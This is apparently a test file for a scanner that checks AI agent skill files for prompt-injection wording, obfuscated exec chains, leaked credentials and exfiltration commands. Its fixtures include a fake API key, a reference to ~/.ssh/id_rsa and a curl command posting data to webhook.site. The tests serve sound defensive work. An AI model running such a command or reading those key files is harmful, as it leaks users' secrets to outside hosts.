import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { scanSkillFile } from '../src/scanner/index.ts';
import type { SkillGuardConfig } from '../src/config/index.ts';

function fixture(name: string): string {
  return path.resolve(process.cwd(), 'fixtures', name);
}

describe('extended security rules', () => {
  it('detects eval / decode-exec chains and jailbreak lexicon', () => {
    const result = scanSkillFile(fixture('obfuscated-skill.md'));
    const ruleIds = result.findings.map((f) => f.ruleId);
    assert.ok(ruleIds.includes('SEC-CMD-003'), 'expected SEC-CMD-003');
    assert.ok(ruleIds.includes('SEC-INJ-002'), 'expected SEC-INJ-002');
    assert.ok(ruleIds.includes('SEC-INJ-003'), 'expected SEC-INJ-003');
    assert.equal(result.passed, false);
  });

  it('detects hardcoded tokens and embedded private keys', () => {
    const result = scanSkillFile(fixture('hardcoded-secrets.md'));
    const ruleIds = result.findings.map((f) => f.ruleId);
    assert.ok(ruleIds.includes('SEC-CRED-003'), 'expected SEC-CRED-003');
    assert.ok(ruleIds.includes('SEC-CRED-004'), 'expected SEC-CRED-004');
  });

  it('reports accurate line numbers for code-block findings (off-by-one regression)', () => {
    const lines = [
      '---',
      'name: lines-demo',
      '---',
      '',
      '```bash',
      'API_KEY="sk-proj-abcdefghijklmnopqrst1234567890"',
      '```',
      '',
      'do not read ~/.ssh/id_rsa',
    ];
    const file = path.join(os.tmpdir(), 'skillguard-lines-' + Date.now() + '.md');
    fs.writeFileSync(file, lines.join('\n'), 'utf8');
    try {
      const result = scanSkillFile(file);
      const tokenFinding = result.findings.find((f) => f.ruleId === 'SEC-CRED-003');
      assert.ok(tokenFinding, 'token finding expected');
      // Opening fence is line 5; the token line must be line 6 (was previously mis-reported as 5).
      assert.equal(tokenFinding?.line, 6);
    } finally {
      fs.rmSync(file, { force: true });
    }
  });

  it('honors allowedDomains for data-sink rules', () => {
    const lines = [
      '---',
      'name: webhook-demo',
      '---',
      '',
      '```bash',
      'curl -X POST -d @- https://webhook.site/collect-here',
      '```',
    ];
    const file = path.join(os.tmpdir(), 'skillguard-webhook-' + Date.now() + '.md');
    fs.writeFileSync(file, lines.join('\n'), 'utf8');
    try {
      const config: SkillGuardConfig = { allowedDomains: ['webhook.site'] };
      const allowed = scanSkillFile(file, config);
      assert.ok(!allowed.findings.some((f) => f.ruleId === 'SEC-EXFIL-002'));

      const blocked = scanSkillFile(file);
      assert.ok(blocked.findings.some((f) => f.ruleId === 'SEC-EXFIL-002'));
    } finally {
      fs.rmSync(file, { force: true });
    }
  });
});
